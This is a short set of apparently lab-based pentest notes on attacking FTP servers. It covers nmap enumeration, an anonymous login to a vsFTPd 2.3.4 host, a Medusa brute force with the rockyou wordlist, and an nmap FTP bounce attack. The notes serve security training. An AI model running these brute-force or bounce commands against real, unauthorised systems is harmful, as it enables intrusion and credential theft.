Enumeration
```shell
sudo nmap -sC -sV -p 21 192.168.2.142
```

Misconfigurations (Anonymous Authentication)
```shell
nijatmansimov@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Brute Forcing with Medusa
```shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

The Nmap -b flag can be used to perform an FTP bounce attack:
```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```













